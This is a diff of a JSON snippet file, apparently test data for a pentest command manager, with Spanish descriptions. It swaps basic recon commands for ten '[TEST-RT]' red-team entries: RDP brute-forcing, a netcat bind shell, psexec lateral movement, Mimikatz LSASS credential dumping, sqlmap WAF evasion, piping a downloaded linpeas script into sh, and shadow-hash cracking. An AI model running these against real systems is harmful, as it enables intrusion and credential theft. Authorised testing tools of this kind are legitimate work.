@@ -1,17 +1,62 @@
 [
-  {
-    "name": "Nmap básico",
-    "category": "recon",
-    "command": "nmap -sV {RHOST}"
-  },
-  {
-    "name": "Nmap puertos",
-    "category": "recon",
-    "command": "nmap -p {RPORT} {RHOST}"
-  },
-  {
-    "name": "Gobuster",
-    "category": "web",
-    "command": "gobuster dir -u {TARGET_URL}"
-  }
+    {
+        "title": "[TEST-RT] Nmap top ports",
+        "command": "nmap --top-ports 100 -T4 {RHOST}",
+        "tags": ["test", "redteam", "nmap"],
+        "description": "Escaneo rápido de los 100 puertos más comunes"
+    },
+    {
+        "title": "[TEST-RT] Gobuster vhosts",
+        "command": "gobuster vhost -u http://{RHOST} -w /usr/share/wordlists/vhosts.txt",
+        "tags": ["test", "redteam", "fuzzing"],
+        "description": "Enumeración de vhosts por fuerza bruta"
+    },
+    {
+        "title": "[TEST-RT] FFUF parámetros",
+        "command": "ffuf -u http://{RHOST}/FUZZ -w /usr/share/wordlists/params.txt",
+        "tags": ["test", "redteam", "fuzzing"],
+        "description": "Fuzzing de parámetros GET"
+    },
+    {
+        "title": "[TEST-RT] Hydra RDP",
+        "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt rdp://{RHOST}",
+        "tags": ["test", "redteam", "bruteforce"],
+        "description": "Ataque de fuerza bruta contra RDP"
+    },
+    {
+        "title": "[TEST-RT] Netcat bind shell",
+        "command": "nc -lvnp {LPORT} -e /bin/bash",
+        "tags": ["test", "redteam", "shell"],
+        "description": "Bind shell a la escucha en el host víctima"
+    },
+    {
+        "title": "[TEST-RT] Impacket psexec",
+        "command": "impacket-psexec {USER}:{PASS}@{RHOST}",
+        "tags": ["test", "redteam", "lateral-movement"],
+        "description": "Movimiento lateral vía SMB con credenciales válidas"
+    },
+    {
+        "title": "[TEST-RT] Mimikatz sekurlsa",
+        "command": "sekurlsa::logonpasswords",
+        "tags": ["test", "redteam", "credenciales"],
+        "description": "Extracción de credenciales en memoria (LSASS)"
+    },
+    {
+        "title": "[TEST-RT] SQLmap tamper",
+        "command": "sqlmap -u \"http://{RHOST}/login.php\" --tamper=space2comment --batch",
+        "tags": ["test", "redteam", "sqlmap"],
+        "description": "Evasión de WAF básico con tamper script"
+    },
+    {
+        "title": "[TEST-RT] Linpeas variante",
+        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -a",
+        "tags": ["test", "redteam", "privesc"],
+        "description": "Enumeración agresiva de privesc en Linux"
+    },
+    {
+        "title": "[TEST-RT] John hash shadow",
+        "command": "john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
+        "tags": ["test", "redteam", "cracking"],
+        "description": "Crackeo de hashes tipo shadow con formato específico"
+    }
 ]
